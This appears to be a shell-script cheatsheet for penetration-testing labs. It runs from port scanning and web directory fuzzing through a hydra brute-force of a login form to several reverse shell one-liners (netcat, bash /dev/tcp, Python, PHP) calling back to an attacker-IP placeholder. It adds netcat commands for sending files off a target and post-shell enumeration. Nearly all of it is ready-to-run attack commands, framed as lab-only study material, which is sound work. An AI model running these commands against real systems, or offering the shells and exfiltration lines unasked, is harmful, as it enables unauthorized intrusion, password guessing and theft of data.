#!/usr/bin/env bash
# enumeration-cheatsheet.sh
# Lab-focused enumeration & initial access cheatsheet (comments explain each step)
# Use only in authorized, isolated lab environments. Replace placeholders before use.

# -------------------------
# Quick port scans
# -------------------------
# Full TCP port scan (fast-ish, verbose)
# Usage: nmap <TARGET_IP> -p- -T4 -v
nmap <TARGET_IP> -p- -T4 -v

# Scan specific/interesting ports with service/version/os detection
# Usage: nmap <TARGET_IP> -p 22,80 -A
nmap <TARGET_IP> -p 22,80 -A

# -------------------------
# HTTP / hosts / basic web checks
# -------------------------
# Add hostname mapping to /etc/hosts for virtual-hosted sites (example)
# Edit and add a line: <TARGET_IP> example.lab
sudo vim /etc/hosts

# Run a basic web server/vuln scan (Nikto)
# Usage: nikto -host <TARGET_IP>
nikto -host <TARGET_IP>

# -------------------------
# Directory & vhost fuzzing
# -------------------------
# dirsearch (simple)
# Usage: dirsearch -u http://example.lab
dirsearch -u http://example.lab

# gobuster directory enumeration
# Usage: gobuster dir -u http://example.lab/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
gobuster dir -u http://example.lab/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

# ffuf directory fuzzing
# Usage: ffuf -w <WORDLIST> -u http://example.lab/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://example.lab/FUZZ

# gobuster vhost discovery
# Usage: gobuster vhost -u http://example.lab/ -w <VHOST_WORDLIST>
gobuster vhost -u http://example.lab/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# -------------------------
# Manual web checks / burp
# -------------------------
# - Check page source for comments, JS endpoints, and config hints
# - Inspect cookies and session tokens
# - Use Burp Suite to intercept, replay, and manipulate requests

# -------------------------
# Credential checks & brute forcing (LAB ONLY)
# -------------------------
# Example hydra template (adjust to target form and response)
# NOTE: Replace the failure-string with the exact failure response text from the login form.
# Example usage (replace placeholders): 
# hydra -l admin -P /path/to/passlist.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"

# -------------------------
# Listeners & reverse shells
# -------------------------
# Start a listener with netcat (traditional)
# Note: netcat versions differ; some do not support -e. Use appropriate stager if -e not available.
nc -nvlp 5555

# Common reverse shell one-liners (replace <ATTACKER_IP> and <PORT>):
# Netcat (if target's nc supports -e)
# nc -e /bin/sh <ATTACKER_IP> <PORT>

# Bash reverse shell
# bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1

# Python reverse shell (python2 example)
# python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP reverse shell (if php CLI available)
# php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell reverse shells are large; use a trusted local snippet when needed (lab only).

# -------------------------
# Transferring files (netcat)
# -------------------------
# Receive a file on attacker:
# nc -nvlp <LOCAL_PORT> > output-file
# Send the file from target:
# nc <ATTACKER_IP> <LOCAL_PORT> < file-to-send

# Example:
# On attacker: nc -nvlp 1234 > exfil.txt
# On target: nc <ATTACKER_IP> 1234 < /path/to/file

# -------------------------
# Post-shell quick checks (do these immediately after getting a shell)
# -------------------------
whoami
id
hostname
uname -a
pwd
ls -la
ps aux

# Check sudo permissions
sudo -l

# -------------------------
# Notes & safety reminders
# -------------------------
# - ALWAYS use placeholders like <TARGET_IP>, <ATTACKER_IP>, LAB-BOX in public notes.
# - DO NOT store or publish real credentials or client-identifying info.
# - Use isolated lab environments (VMs, containers, or dedicated lab networks).
# - Keep all content educational and redacted before making public.
